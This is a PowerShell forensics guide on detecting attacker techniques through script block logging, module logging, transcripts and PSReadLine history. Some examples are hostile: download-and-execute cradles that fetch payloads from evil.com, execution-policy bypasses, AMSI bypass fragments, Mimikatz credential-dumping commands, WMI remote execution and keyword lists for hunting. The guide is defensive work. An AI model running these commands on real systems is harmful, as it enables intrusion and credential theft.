# PowerShell Forensics — Attacker TTP Detection

> Marcus Paula | IT Engineer — TikTok EMEA | PG Diploma Cyber Security, NCI Dublin

PowerShell is the most commonly abused built-in tool in Windows environments.
This guide covers evidence sources, evasion techniques, and detection methods.

---

## PowerShell Logging Overview

Three independent logging mechanisms — enable all three for full visibility:

| Mechanism | What It Captures | Event IDs | Default |
|-----------|-----------------|-----------|---------|
| **Module Logging** | Pipeline input/output of specific modules | 4103 | Disabled |
| **Script Block Logging** | Full text of every script block executed (auto-decodes encoded scripts) | 4104 | Disabled |
| **Transcription** | Input and output of every PS session to a text file | — | Disabled |

---

## Enabling Full PowerShell Logging (Group Policy)

```
Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell

- Turn on Module Logging → Enabled → Module names: *
- Turn on PowerShell Script Block Logging → Enabled
- Turn on Script Execution → Enabled (All Scripts)

For Transcription:
- Turn on PowerShell Transcription → Enabled → Transcript output directory: \\server\pslogs
```

### Registry-based (for quick deployment)
```powershell
# Script Block Logging
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1

# Module Logging
$regPath2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
New-Item -Path $regPath2 -Force
Set-ItemProperty -Path $regPath2 -Name "EnableModuleLogging" -Value 1
Set-ItemProperty -Path $regPath2 -Name "ModuleNames" -Value "*"
```

---

## Evidence Locations

### Event Log Paths
```
C:\Windows\System32\winevt\Logs\
  Microsoft-Windows-PowerShell%4Operational.evtx   — Module/ScriptBlock logs (4103, 4104)
  Windows PowerShell.evtx                           — Classic PS log (400, 600)
```

### Console History (PSReadLine)
```
C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# This persists between sessions and is NOT cleared by clearing the screen
# One line per command, no timestamps (check filesystem metadata for approximate time)
```

### Transcript Files
```
# Location configured in GPO — default suggested location:
\\fileserver\pslogs\[computer]\[date]\PowerShell_transcript.[computer].[hash].[timestamp].txt

# Local transcripts (if locally configured)
C:\Users\[user]\Documents\  (or user-specified path)
```

---

## Analysing PowerShell Events

### Event ID 4104 — Script Block Logging
```powershell
# Get all 4104 events (script block execution) from last 24 hours
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'
  Id=4104
  StartTime=(Get-Date).AddHours(-24)
} | Select-Object TimeCreated, @{n='ScriptBlock';e={$_.Properties[2].Value}} |
  Where-Object {$_.ScriptBlock -match "Invoke-|IEX|DownloadString|FromBase64|Mimikatz|bypass|hidden"} |
  Format-List

# Export all 4104 script blocks for review
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} |
  ForEach-Object {
    [PSCustomObject]@{
      Time = $_.TimeCreated
      ScriptBlock = $_.Properties[2].Value
    }
  } | Export-Csv C:\Temp\scriptblocks.csv -NoTypeInformation
```

### Event ID 4103 — Module Logging
```powershell
# Pipeline execution details
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-PowerShell/Operational'
  Id=4103
} | Select-Object TimeCreated, @{n='Details';e={$_.Message}} | Format-List
```

### Classic PS Log (Event ID 400)
```powershell
# PowerShell engine start events — includes hostname, PS version
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; Id=400} |
  Select-Object TimeCreated, @{n='HostName';e={
    if ($_.Message -match 'HostName=(.+?)\n') {$Matches[1].Trim()}
  }} | Format-Table -AutoSize
```

---

## Common Attacker Techniques and Detection

### 1. Encoded Commands (-EncodedCommand / -enc)
```powershell
# Attackers use Base64 encoding to evade basic keyword detection
# Example attack command:
# powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg...

# Detection: 4688 or Sysmon Event 1 will show the encoded command
# Script Block Logging (4104) automatically decodes it

# Manual decode
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABz..."))
```

### 2. Execution Policy Bypass
```
Common bypasses seen in the wild:
  powershell.exe -ExecutionPolicy Bypass -File script.ps1
  powershell.exe -ep bypass
  powershell.exe -ExecutionPolicy Unrestricted
  
  # In-memory execution (bypasses policy entirely)
  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

### 3. Download Cradles (In-Memory Execution)
```powershell
# Classic download cradle patterns — flag these in 4104 logs
(New-Object System.Net.WebClient).DownloadString('http://...')
IEX (New-Object Net.WebClient).DownloadString('http://...')
Invoke-Expression (Invoke-WebRequest 'http://...')
[System.Net.WebClient]::new().DownloadFile('http://...', 'C:\path')

# BITS-based (evades some network monitoring)
Start-BitsTransfer -Source "http://evil.com/payload.exe" -Destination "C:\Temp\payload.exe"

# WinHTTP
$wc = [System.Net.WebRequest]::Create('http://evil.com/payload.ps1')
IEX $wc.GetResponse().GetResponseStream()
```

### 4. AMSI Bypass Attempts
```
AMSI (Antimalware Scan Interface) scans PowerShell for malicious content.
Attackers attempt to disable it before running further payloads.

Common bypass patterns in 4104 logs:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...
  amsiInitFailed
  $a=[Ref].Assembly.GetType(...)
  
These strings in a script block are a strong indicator of malicious activity.
```

### 5. Credential Dumping (Mimikatz / PowerSploit)
```powershell
# Mimikatz via PowerShell
Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -DumpCreds

# Get-Credential extraction patterns
# Watching for: sekurlsa, privilege::debug, token::elevate, lsadump

# LSASS memory access via Sysmon Event ID 10
# TargetImage: C:\Windows\System32\lsass.exe
# GrantedAccess: 0x1010 or 0x1410 (common credential dump access masks)
```

### 6. WMI Abuse
```powershell
# Remote command execution via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c ..." -ComputerName target

# WMI persistence (Event subscription)
# Sysmon Event 19, 20, 21 — WMI filter/consumer/subscription
# Windows Event: Microsoft-Windows-WMI-Activity/Operational Event 5861
```

### 7. PowerShell Remoting (Lateral Movement)
```powershell
# PSRemoting leaves evidence in:
# - Security log: 4624 (Logon Type 3 or 8)
# - Microsoft-Windows-PowerShell%4Operational on BOTH source and destination
# - Microsoft-Windows-WinRM%4Operational.evtx

# Detection: look for 4104 events on a machine that originated from a remote session
# HostName in Event ID 400 will show "ServerRemoteHost" for remote sessions
```

---

## PSReadLine History Analysis

```powershell
# Read history file
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-Content $histFile

# Search for suspicious commands in history
Get-Content $histFile | Select-String -Pattern "Invoke-|IEX|DownloadString|bypass|mimikatz|base64|encoded|-enc"

# Check modification time (approximate last activity)
(Get-Item $histFile).LastWriteTime
```

---

## Transcript Analysis

```powershell
# Transcript format includes:
# - Start/end timestamp
# - Username
# - Machine name
# - Transcript path
# - Full input and output of commands

# Parse transcript directory for suspicious content
Get-ChildItem "\\server\pslogs" -Recurse -Filter "*.txt" |
  Select-String -Pattern "Invoke-|IEX|DownloadString|mimikatz|sekurlsa|bypass" |
  Select-Object Filename, LineNumber, Line | Format-Table -AutoSize
```

---

## PowerShell Version Downgrade Attack

Attackers may invoke `powershell.exe -Version 2` to use PowerShell 2.0,
which lacks Script Block Logging and AMSI integration.

```powershell
# Detection: Event ID 400 in Windows PowerShell.evtx will show EngineVersion=2.0
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; Id=400} |
  Where-Object {$_.Message -match 'EngineVersion=2\.0'} |
  Select-Object TimeCreated, Message

# Mitigation: Remove PowerShell 2.0 if not required
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

---

## Quick IOC Hunt (PowerShell)

```powershell
# Rapid hunt for PowerShell-based compromise indicators
$keywords = @("IEX","Invoke-Expression","DownloadString","FromBase64String",
              "EncodedCommand","bypass","mimikatz","sekurlsa","amsiutils",
              "ReflectivePE","Invoke-Shellcode","powercat","powerup","powerview")

foreach ($kw in $keywords) {
    $events = Get-WinEvent -FilterHashtable @{
        LogName='Microsoft-Windows-PowerShell/Operational'
        Id=4104
    } -ErrorAction SilentlyContinue |
    Where-Object {$_.Properties[2].Value -match $kw}
    
    if ($events) {
        Write-Host "FOUND: $kw ($($events.Count) events)" -ForegroundColor Red
        $events | Select-Object TimeCreated, @{n='Block';e={$_.Properties[2].Value[0..200] -join ''}} |
          Format-Table -AutoSize
    }
}
```

---

*References: SANS FOR508, FireEye/Mandiant PowerShell Logging Guidance, MITRE ATT&CK T1059.001*
